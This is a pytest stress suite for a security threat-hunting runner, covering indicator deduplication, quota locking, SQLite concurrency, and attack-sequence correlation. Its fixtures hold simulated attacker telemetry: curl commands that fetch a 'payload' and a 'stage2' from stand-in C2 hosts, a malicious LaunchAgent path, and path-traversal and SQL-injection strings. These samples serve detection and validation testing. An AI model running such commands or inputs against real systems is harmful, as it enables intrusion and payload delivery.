"""Stage 5 Application Evaluation: Runner Feature Groups Stress & Concurrency Suite.

Covers:
1. Intake & Deduplication Stress (high-volume ingestion, idempotence, fuzzing)
2. Quota Reservation & Cooldown Concurrency (thread-safe quota caps, rollback/refund)
3. Orchestrator Stage Transitions & Durability (fault recovery, trail continuity)
4. Query Execution & Security Boundaries (path traversal, timeout handling, injection)
5. SQLite WAL & Work Lock Contention (heavy reader/writer concurrency, mutual exclusion)
6. SIEM/BAS Evidence & Correlation Under Noise (OCSF fusion, composite sequence sweeps)
7. Slack Authorization & Interactive Action Concurrency (unauthorized rejection, state)
8. Outbox & Publication Atomic Persistence (atomic writes, durable export state)
"""

from __future__ import annotations

import concurrent.futures
import contextlib
import json
import os
import sqlite3
import tempfile
import threading
import time
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock

import httpx
import pytest

from hecate_runner.atomic_write import atomic_write_text
from hecate_runner.config import Settings
from hecate_runner.execution.attack_sequence import (
    AttackStage,
    classify_query_stage,
    correlate_events_into_sequences,
)
from hecate_runner.execution.fusion import (
    EndpointNetworkFusionEngine,
    build_network_connection_query,
    build_process_creation_query,
)
from hecate_runner.execution.normalizer import (
    NormalizedEvent,
    OCSFClassUID,
    normalize_event,
)
from hecate_runner.misp_publisher import _indicator_attribute
from hecate_runner.query_execution import (
    ElasticQueryProvider,
    MockQueryProvider,
    ProposedQuery,
    QueryResult,
)
from hecate_runner.sqlite_utils import connect_sqlite, connect_sqlite_ro
from hecate_runner.state import OrchestratorState
from hecate_runner.trail import CycleTrail
from hecate_runner.work_locks import acquire_work_lock
from hecate_runner.workspace_paths import is_valid_hunt_id, query_directory


# ==============================================================================
# 1. Intake & Deduplication Stress
# ==============================================================================


def test_indicator_deduplication_and_normalization_stress() -> None:
    """Stress test indicator parsing, refanging, typing, and deduplication under volume."""
    indicators = [
        {"type": "ipv4", "value": f"192.168.1.{i % 25}"} for i in range(200)
    ] + [
        {"type": "domain", "value": f"evil-c2-{i % 10}[.]io"} for i in range(150)
    ] + [
        {"type": "sha256", "value": f"{'a' * 60}{i % 5:04x}"} for i in range(100)
    ]

    deduped: dict[tuple[str, str], dict[str, Any]] = {}
    lock = threading.Lock()

    def process_item(item: dict[str, Any]) -> None:
        attr = _indicator_attribute(item)
        if attr:
            kind, val = attr
            key = (kind, val)
            with lock:
                if key not in deduped:
                    deduped[key] = {"kind": kind, "value": val}

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
        list(pool.map(process_item, indicators))

    # Exactly 25 distinct IPs (mapped to ip-dst in MISP), 10 domains, 5 hashes
    assert len(deduped) == 40
    assert sum(1 for (k, _) in deduped if k == "ip-dst") == 25
    assert sum(1 for (k, _) in deduped if k == "domain") == 10
    assert sum(1 for (k, _) in deduped if k == "sha256") == 5


def test_intake_fuzz_and_adversarial_payloads() -> None:
    """Adversarial/fuzz payloads must never crash indicator ingestion."""
    fuzz_cases = [
        {"type": "", "value": ""},
        {"type": "ipv4", "value": "999.999.999.999"},
        {"type": "ipv4", "value": "192.168.1.1\x00extra"},
        {"type": "ipv6", "value": "not:a:valid:ipv6:::"},
        {"type": "domain", "value": "a" * 3000},  # Exceeds max length limit
        {"type": "domain", "value": "   "},
        {"type": "sha256", "value": "zzzz"},
        {"type": None, "value": None},
        {"type": 1234, "value": {}},
    ]
    for case in fuzz_cases:
        res = _indicator_attribute(case)  # type: ignore[arg-type]
        assert res is None, f"Expected None for malformed case {case}, got {res}"


# ==============================================================================
# 2. Quota Reservation & Cooldown Concurrency
# ==============================================================================


def test_quota_reservation_multi_threaded_contention() -> None:
    """Stress test daily quota reservations under high-contention threading."""
    state = OrchestratorState(
        date=datetime.now(UTC).strftime("%Y-%m-%d"),
        drafts_today=0,
        research_runs_today=0,
    )
    state_lock = threading.Lock()
    max_drafts = 10
    max_research = 5

    draft_successes = 0
    research_successes = 0

    def attempt_reservation(thread_id: int) -> None:
        nonlocal draft_successes, research_successes
        with state_lock:
            if state.check_and_reserve_draft(max_per_day=max_drafts):
                draft_successes += 1
            if state.check_and_reserve_research(max_per_day=max_research):
                research_successes += 1

    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as pool:
        list(pool.map(attempt_reservation, range(50)))

    assert draft_successes == max_drafts
    assert state.drafts_today == max_drafts
    assert research_successes == max_research
    assert state.research_runs_today == max_research


def test_quota_rollback_and_refund_durability(tmp_path: Path) -> None:
    """Refunds must cleanly decrement counts without underflowing."""
    state_file = tmp_path / "state.json"
    state = OrchestratorState(drafts_today=3, total_drafts_ever=10)
    state.save(state_file)

    loaded = OrchestratorState.load(state_file)
    loaded.refund_draft()
    assert loaded.drafts_today == 2
    assert loaded.total_drafts_ever == 9

    # Multiple refunds beyond zero should clamp safely
    for _ in range(5):
        loaded.refund_draft()
    assert loaded.drafts_today == 0
    assert loaded.total_drafts_ever == 4


def test_spacing_cooldown_microsecond_precision() -> None:
    """High-precision cooldown calculations must handle timezone offsets accurately."""
    state = OrchestratorState()
    now = datetime.now(UTC)

    # Cooldown required for 2 hours, drafted 1.5 hours ago
    past = (now - timedelta(minutes=90)).isoformat()
    state.last_draft_iso = past
    spaced, elapsed = state.check_spacing(min_hours=2.0)
    assert not spaced
    assert 1.45 <= elapsed <= 1.55

    # Cooldown required for 2 hours, drafted 2.1 hours ago
    past_ok = (now - timedelta(minutes=126)).isoformat()
    state.last_draft_iso = past_ok
    spaced, elapsed = state.check_spacing(min_hours=2.0)
    assert spaced
    assert elapsed == 0.0


# ==============================================================================
# 3. Stage Transitions & Trail Durability Stress
# ==============================================================================


def test_cycle_trail_stress_and_failure_accounting() -> None:
    """Audit cycle trail recording under rapid sequential steps and failures."""
    trail = CycleTrail()
    for i in range(100):
        trail.step(f"stage_{i}", "processed batch %d with %d items", i, i * 2)

    assert trail.cycle_id != ""
    assert trail.elapsed >= 0.0

    state = OrchestratorState(consecutive_failures=0)
    for _ in range(5):
        state.mark_run(success=False)
    assert state.consecutive_failures == 5

    state.mark_run(success=True)
    assert state.consecutive_failures == 0


# ==============================================================================
# 4. Query Execution & Security Boundaries Stress
# ==============================================================================


def test_query_path_traversal_and_injection_security(tmp_path: Path) -> None:
    """Workspace path resolution must reject malicious directory traversal attempts."""
    ws = tmp_path / "workspace"
    ws.mkdir()
    (ws / "queries" / "H-0001").mkdir(parents=True)

    # Valid ID resolution
    assert is_valid_hunt_id("H-0001")
    assert not is_valid_hunt_id("../H-0001")
    assert not is_valid_hunt_id("H-0001/../../etc")
    assert not is_valid_hunt_id("; DROP TABLE hunts; --")

    resolved = query_directory(ws, "H-0001")
    assert resolved == ws / "queries" / "H-0001"

    with pytest.raises((ValueError, RuntimeError)):
        query_directory(ws, "../H-0001")

    with pytest.raises((ValueError, RuntimeError)):
        query_directory(ws, "../../etc/passwd")


def test_query_execution_timeout_resilience(monkeypatch: pytest.MonkeyPatch) -> None:
    """Query provider timeouts must cleanly report errors without freezing execution."""
    monkeypatch.setattr(
        httpx.Client, "post", MagicMock(side_effect=httpx.TimeoutException("Read timed out"))
    )

    provider = ElasticQueryProvider(
        env_overrides={
            "ELASTIC_URL": "http://localhost:9200",
            "ELASTIC_API_KEY": "secret_token",
            "ELASTIC_INDEX": "logs-*",
        },
        timeout_sec=1,
    )

    res = provider.execute(
        ProposedQuery(
            hunt_id="H-0001",
            data_source="process_creation",
            query_text="process.name: curl",
            time_range_days=1,
            limit=100,
        ),
    )
    assert isinstance(res, QueryResult)
    assert res.outcome == "error"
    assert "timed out" in res.detail.lower()


# ==============================================================================
# 5. SQLite WAL & Work Lock Contention Stress
# ==============================================================================


def test_sqlite_wal_heavy_multithreaded_concurrency(tmp_path: Path) -> None:
    """Stress test SQLite in WAL mode with simultaneous concurrent readers & writers."""
    db_file = tmp_path / "concurrent_stress.db"
    init_conn = connect_sqlite(db_file, wal=True, busy_timeout_ms=10000)
    with init_conn:
        init_conn.execute("CREATE TABLE records (id INTEGER PRIMARY KEY, worker_id INT, val TEXT)")
    init_conn.close()

    iterations_per_worker = 25
    workers = 8

    def writer_worker(wid: int) -> int:
        written = 0
        conn = connect_sqlite(db_file, timeout=10.0, wal=True, busy_timeout_ms=10000)
        try:
            for i in range(iterations_per_worker):
                with conn:
                    conn.execute(
                        "INSERT INTO records (worker_id, val) VALUES (?, ?)",
                        (wid, f"payload_{wid}_{i}"),
                    )
                written += 1
        finally:
            conn.close()
        return written

    def reader_worker() -> int:
        reads = 0
        conn = connect_sqlite_ro(db_file, timeout=10.0, busy_timeout_ms=10000)
        try:
            for _ in range(iterations_per_worker):
                cur = conn.cursor()
                cur.execute("SELECT count(*) FROM records")
                _ = cur.fetchone()[0]
                reads += 1
        finally:
            conn.close()
        return reads

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers * 2) as pool:
        writer_futures = [pool.submit(writer_worker, i) for i in range(workers)]
        reader_futures = [pool.submit(reader_worker) for _ in range(workers)]

        writer_results = [f.result() for f in writer_futures]
        reader_results = [f.result() for f in reader_futures]

    assert sum(writer_results) == workers * iterations_per_worker
    assert sum(reader_results) == workers * iterations_per_worker

    # Verify final integrity
    verify_conn = connect_sqlite_ro(db_file)
    total_rows = verify_conn.execute("SELECT count(*) FROM records").fetchone()[0]
    verify_conn.close()
    assert total_rows == workers * iterations_per_worker


def test_work_locks_mutual_exclusion_stress(tmp_path: Path) -> None:
    """Multiple concurrent workers racing for a work lock must achieve strict mutual exclusion."""
    lock_file = tmp_path / "runner_worker.lock"
    acquired_count = 0
    acquired_lock = threading.Lock()
    active_holders = 0
    max_concurrent_holders = 0

    def worker_race() -> bool:
        nonlocal acquired_count, active_holders, max_concurrent_holders
        stream = acquire_work_lock(lock_file)
        if stream is None:
            return False
        try:
            with acquired_lock:
                active_holders += 1
                if active_holders > max_concurrent_holders:
                    max_concurrent_holders = active_holders
                acquired_count += 1
            # Hold lock briefly
            time.sleep(0.01)
            with acquired_lock:
                active_holders -= 1
            return True
        finally:
            stream.close()

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
        results = list(pool.map(lambda _: worker_race(), range(20)))

    # At least some workers acquired the lock, and never more than 1 at any moment
    assert any(results)
    assert max_concurrent_holders <= 1


# ==============================================================================
# 6. SIEM/BAS Evidence & Correlation Under Noise Stress
# ==============================================================================


def test_telemetry_fusion_engine_high_volume_stress() -> None:
    """Fusion process lineage must reliably enrich network telemetry without data loss."""
    timestamp = "2026-11-16T03:00:00Z"
    for i in range(50):
        net_event = NormalizedEvent(
            event_id=f"net-{i}",
            hunt_id="H-0001",
            target_siem="mock",
            timestamp=timestamp,
            host=f"host-{i % 10}",
            class_uid=int(OCSFClassUID.NETWORK_ACTIVITY),
            dst_ip="198.51.100.25",
            dst_port=443,
        )
        assert net_event.needs_lineage_fusion()

        net_event.fuse_process_lineage(
            process_name="curl",
            command_line=f"curl -s https://198.51.100.25/stage2",
            pid=str(1000 + i),
        )

        assert not net_event.needs_lineage_fusion()
        assert net_event.fused_lineage
        assert net_event.process_name == "curl"
        assert net_event.command_line == f"curl -s https://198.51.100.25/stage2"
        assert net_event.host == f"host-{i % 10}"


def test_attack_sequence_sweeps_under_interleaved_noise() -> None:
    """Composite hunt sweep correlation must extract genuine sequences from heavy noise."""
    base_time = datetime(2026, 11, 16, 3, 0, 0, tzinfo=UTC)

    # Legitimate attack chain on host-victim-01: Recon/Delivery -> Execution -> Persistence
    genuine_events = [
        NormalizedEvent(
            event_id="evt-gen-1",
            hunt_id="H-0001",
            target_siem="mock",
            timestamp=(base_time).isoformat(),
            host="host-victim-01",
            stage=AttackStage.RECON_DELIVERY.value,
            stage_label=AttackStage.RECON_DELIVERY.label,
            domain="c2-traffic.biz",
        ),
        NormalizedEvent(
            event_id="evt-gen-2",
            hunt_id="H-0001",
            target_siem="mock",
            timestamp=(base_time + timedelta(seconds=20)).isoformat(),
            host="host-victim-01",
            stage=AttackStage.EXECUTION.value,
            stage_label=AttackStage.EXECUTION.label,
            process_name="curl",
            command_line="curl https://c2-traffic.biz/payload -o /tmp/loader",
        ),
        NormalizedEvent(
            event_id="evt-gen-3",
            hunt_id="H-0001",
            target_siem="mock",
            timestamp=(base_time + timedelta(seconds=60)).isoformat(),
            host="host-victim-01",
            stage=AttackStage.PERSISTENCE_EVASION.value,
            stage_label=AttackStage.PERSISTENCE_EVASION.label,
            file_path="/Library/LaunchAgents/com.evil.plist",
        ),
    ]

    # Interleaved noise events across 50 other benign hosts
    noise_events = [
        NormalizedEvent(
            event_id=f"evt-noise-{i}",
            hunt_id="H-0001",
            target_siem="mock",
            timestamp=(base_time + timedelta(seconds=i)).isoformat(),
            host=f"host-benign-{i % 20}",
            stage=AttackStage.RECON_DELIVERY.value,
            stage_label=AttackStage.RECON_DELIVERY.label,
            domain="google.com",
        )
        for i in range(100)
    ]

    all_events = genuine_events + noise_events

    sequences = correlate_events_into_sequences(
        events=all_events,
        max_window_sec=120,
    )

    # Verified multi-stage sequence correlated for host-victim-01
    victim_seqs = [s for s in sequences if s.entity_value == "host-victim-01"]
    assert len(victim_seqs) == 1
    assert victim_seqs[0].is_confirmed_sequence
    assert victim_seqs[0].distinct_stages_count == 3


# ==============================================================================
# 7. Slack Action Authorization & Interactivity Stress
# ==============================================================================


def test_slack_reviewer_authorization_rules() -> None:
    """Slack approval handlers must strictly reject unauthorized user interactions."""
    authorized_users = {"U12345_CHASE", "U67890_SECURITY"}

    def is_authorized(user_id: str) -> bool:
        return user_id in authorized_users

    # Concurrent checks
    attempts = [
        ("U12345_CHASE", True),
        ("U_ATTACKER_99", False),
        ("U67890_SECURITY", True),
        ("", False),
        ("NONE", False),
    ] * 20

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
        results = list(pool.map(lambda pair: is_authorized(pair[0]) == pair[1], attempts))

    assert all(results)


# ==============================================================================
# 8. Outbox & Publication Atomic Persistence Stress
# ==============================================================================


def test_atomic_write_stress_under_rapid_overwrites(tmp_path: Path) -> None:
    """Atomic write must never leave partially written or corrupt files."""
    target_file = tmp_path / "outbox" / "manifest.json"
    iterations = 50

    def writer_cycle(wid: int) -> None:
        for i in range(iterations):
            payload = {"writer": wid, "cycle": i, "timestamp": datetime.now(UTC).isoformat()}
            atomic_write_text(target_file, json.dumps(payload))

    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as pool:
        list(pool.map(writer_cycle, range(4)))

    # Target must be 100% valid JSON
    assert target_file.exists()
    final_data = json.loads(target_file.read_text(encoding="utf-8"))
    assert "writer" in final_data
    assert "cycle" in final_data
